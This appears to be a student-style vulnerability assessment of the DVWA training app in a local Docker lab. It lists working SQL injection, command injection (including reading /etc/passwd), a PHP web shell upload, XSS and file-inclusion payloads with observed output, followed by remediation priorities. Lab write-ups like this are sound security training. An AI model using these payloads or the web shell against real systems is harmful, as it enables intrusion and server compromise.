# 04 – Vulnerability Assessment

## Overview

This phase validates the threats identified during Threat Modeling through
controlled vulnerability testing against the Damn Vulnerable Web Application (DVWA).

Only vulnerabilities that were **successfully tested and evidenced** are reported
as confirmed findings. Attempts that did not result in successful exploitation
are explicitly documented to preserve assessment accuracy.

---

## Assessment Context

- Target Application: Damn Vulnerable Web Application (DVWA)
- Base URL: http://localhost:4280
- Security Level: LOW
- Environment: Local Docker-based training lab

---

## Methodology

The vulnerability assessment followed a structured approach:

1. Automated reconnaissance using **Nikto** to identify misconfigurations
2. Manual vulnerability testing using crafted payloads
3. Validation based on **observable output and behavior**
4. Risk classification using likelihood and impact

---

## Summary of Findings

| Severity  | Count |
|---------|-------|
| Critical | 3 |
| High    | 2 |
| Medium  | 2 |
| Low     | 1 |
| **Total** | **8** |

**Overall Risk Rating:** **Critical**

---

## Detailed Findings

---

## 1. SQL Injection  
**Severity:** Critical  
**Status:** Confirmed  

**Location**
/vulnerabilities/sqli/


### Successful Payloads & Outputs

**Logical Bypass**
```sql
1' OR '1'='1
```


**Observed Output**
- Multiple user records returned:
  - admin / admin
  - Gordon Brown
  - Hack Me
  - Pablo Picasso
  - Bob Smith

This confirms full manipulation of the SQL WHERE clause.

---

**UNION-Based SQL Injection**
```sql
1' UNION SELECT null, database() #
```

**Output**
dvwa

```sql
1' UNION SELECT null, user() #
```


**Output**
dvwa@172.18.0.3

```sql
1' UNION SELECT null, version() #
```


**Output**
10.11.13-MariaDB-ubu2204


### Impact
- Database enumeration
- Backend fingerprinting
- Potential data exfiltration

---

## 2. Command Injection  
**Severity:** Critical  
**Status:** Confirmed  

**Location**
/vulnerabilities/exec/


**Successful Payloads**
```bash
; whoami
&& id
| cat /etc/passwd
; ps aux
```

**Observed Output**
- OS commands executed successfully
- Web server user identified (`www-data`)
- System files disclosed

**Impact**
- Arbitrary OS command execution
- Full server-side compromise within web context

---

## 3. Unrestricted File Upload → Remote Code Execution  
**Severity:** Critical  
**Status:** Confirmed  

**Location**
/vulnerabilities/upload/


**Payload Uploaded**
```php
<?php system($_GET['cmd']); ?>
```
Verification

/hackable/uploads/shell.php?cmd=whoami
Output

www-data
Additional Observations

Multiple dangerous extensions accepted (.php, .php5, .phtml, .php.jpg)

Uploaded scripts executed directly

## 4. Cross-Site Request Forgery (CSRF)
**Severity**: High
**Status**: Confirmed

Location

/vulnerabilities/csrf/
Observed Behavior

Password change triggered via GET request

No CSRF token or origin validation

Action executed when authenticated user visits malicious page

Impact

Forced password change

Account takeover

## 5. Cross-Site Scripting (XSS – Reflected)
**Severity**: High
**Status**: Confirmed

Location

/vulnerabilities/xss_r/
Successful Payloads
php-template

```php
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

Observed Behavior

JavaScript executed immediately in browser

Multiple contexts exploitable (script, attribute, SVG)

Impact

Session hijacking

Phishing

Client-side data theft

## 6. XSS – Stored
**Severity**: N/A
**Status**: Not Confirmed

Location

/vulnerabilities/xss_s/
Attempted Payload

php-template

```php
<script>alert('Stored XSS')</script>
```

Observed Behavior

Input length restriction prevented full payload insertion

No persistent JavaScript execution observed

Conclusion
Stored XSS was attempted but not confirmed exploitable in this test run.
Reflected XSS remains the confirmed high-risk issue.

## 7. Local File Inclusion (LFI)
**Severity**: Medium
**Status**: Partially Confirmed

Location

/vulnerabilities/fi/
Tested Payloads

```bash
../../../../etc/passwd
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

Observed Behavior

PHP warnings indicate user input reaches include()

No file contents disclosed due to environment constraints

## 8. Brute Force Authentication
**Severity**: Medium
**Status**: Confirmed

Location

/vulnerabilities/brute/
Observed

Unlimited login attempts

Valid credentials discovered (admin/password)

No rate limiting or lockout

## 9. Web Server Misconfiguration (Nikto)
**Severity**: Low
**Status**: Confirmed

Findings

Missing CSP

Missing HSTS

Missing X-Content-Type-Options

Technology disclosure via headers

## Risk Prioritization Summary

| Vulnerability            | Risk     |
|--------------------------|----------|
| File Upload RCE          | Critical |
| Command Injection        | Critical |
| SQL Injection            | Critical |
| CSRF                     | High     |
| Reflected XSS            | High     |
| LFI                      | Medium   |
| Brute Force              | Medium   |
| Header Issues            | Low      |

## Conclusion
This assessment confirms multiple high-impact vulnerabilities that would allow
full compromise of a real-world application.

## Key Risk Implications

The most critical risks identified during this assessment enable:

- **Remote Code Execution (RCE)**
- **Database compromise**
- **Account takeover**

## Remediation Priority

Immediate remediation efforts should focus on:

1. Eliminating all **Remote Code Execution (RCE)** vectors
2. Remediating **injection flaws** (SQL Injection, Command Injection)
3. Strengthening **authentication and session management controls**

Next Phase
➡️ 05 – Post-Exploitation & Impact Analysis

